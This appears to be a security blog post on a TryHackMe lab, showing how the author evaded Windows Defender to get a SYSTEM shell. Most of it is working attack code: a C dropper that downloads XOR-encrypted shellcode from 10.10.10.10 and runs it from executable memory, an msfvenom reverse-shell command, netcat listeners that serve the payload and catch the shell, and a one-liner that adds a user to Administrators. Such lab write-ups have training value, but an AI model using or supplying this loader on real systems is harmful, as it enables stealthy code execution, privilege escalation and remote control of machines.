---
title: "Bypass Windows Defender with a simple custom shellcode"
categories:
  - Shellcode
tags:
  - Bypass AV
---


Earlier this week I worked against a TryHackMe room called [Hack Smarter Security](https://tryhackme.com/r/room/hacksmartersecurity).

This room is pretty interesting, but I won't write a full writeup, there is already enough of them. Instead I want to focus on the AV evasion.


#### Target

The target is a Windows VM featuring a vulnerable WebApp, leading to user credentials discovery.
Once connected through SSH, internal enumeration reveal that Windows Defender is active.

Long story short, we need to exploit a service and replace its executable with a malicious payload that will be executed as SYSTEM. This payload could initiate a shell, or add our current user to administrators localgroup for example.

To be honest this room doesn't require to put effort on AV evasion because a simple, non-detectable payload is enough, as show below :

```
#include <stdlib.h>

int main() {
  system("cmd.exe /c net localgroup Administrators tyler /add");
  return 0;
}

```
Credits goest to [jaxafed's writeup](https://jaxafed.github.io/posts/tryhackme-hack_smarter_security/)


This works, but I could get a shell as SYSTEM ! Obviously I tried a few metasploit payloads, but they are well known to AV vendors and are instantly flagged as malicious.
I used some learnings from [TryHackMe room on AV evasion](https://tryhackme.com/r/room/avevasionshellcode) and build a C# payload, then packed it with [Confuser](https://github.com/mkaring/ConfuserEx).

Well it worked, but somehow was a bit frustrated, and I wanted to work on C based shellcodes.

I am more familiar with C# and already had a staged shellcode with XOR encryption in this langage, so why not try something similar in C ?


#### Shellcode

So my goal is to build a XOR encrypted payload from metasploit and have a dropper to download said payload, decrypt and execute it from memory. That way, our shellcode won't be wrote on disk for maximum stealth.


Good news is I already have most parts I needed, let's start with network :

```
//IP and port where to fetch our shellcode
int port = 9002;
char ip[] = "10.10.10.10";

//initialize struct
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in serv_addr;
serv_addr.sin_family = AF_INET;
serv_addr.sin_port = htons(port);
serv_addr.sin_addr.s_addr = inet_addr(ip);

//connect back home
int n = connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

//copy our shellcode into buffer
unsigned char buffer[BUFFER_SIZE];
n = recv(sockfd, buffer, BUFFER_SIZE, 0);
```

```
//de-Xor shellcode
char key[] = "MyShellcodePassword";
unsigned char shellcode[n];

for (int i = 0; i < n; i++)
    shellcode[i] = buffer[i] ^ key[i % strlen(key)];

//copy shellcode in memory and execute it
void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, sizeof shellcode);
((void(*)())exec)();
```

And that's about it ! I snipped small parts, full code is on my [shellcode repos](https://github.com/20100dbg/shellcodes).
Now we need to generate a reverse shell payload, let's use msfvenom :

```
//create a reverse shell payload. Our shellcode is XOR encrypted with "MyShellcodePassword" as key, result is in a file called 'shellcode'
msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.10 lport=9001 --encrypt xor --encrypt-key MyShellcodePassword -f raw -o shellcode

//this listener will serve our shellcode
nc -lvnp 9002 < shellcode

//this listener will catch our reverse shell
nc -lvnp 9001
```

#### The end ?

This should work fine. But if you remember correctly, we are exploiting a vulnerable *service*. A service executable needs specific functions that can be called by Service manager.

Once again I'm in luck because I got a service template from [Windows Privesc Arena's room](https://tryhackme.com/r/room/windowsprivescarena)

We only have to paste our dropper in Run() function and that's it.

Let's compile :
```
mingw32-gcc.exe .\service.c -lwsock32
```

And here's the result :

![Got root ?](/assets/images/post-20240426/01_win.png)
